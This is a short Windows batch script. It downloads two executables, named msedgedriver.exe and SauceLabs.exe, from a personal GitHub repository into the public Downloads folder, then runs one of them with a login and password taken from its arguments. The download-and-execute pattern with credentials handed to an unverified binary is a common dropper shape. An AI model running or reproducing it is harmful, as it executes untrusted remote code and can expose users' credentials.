set lg=%1
set psw=%2
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/msedgedriver.exe" -OutFile "C:\Users\Public\Downloads\msedgedriver.exe"
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/SauceLabs.exe" -OutFile "C:\Users\Public\Downloads\saucelabs.exe"
C:\Users\Public\Downloads\saucelabs.exe -e %lg% -p %psw%
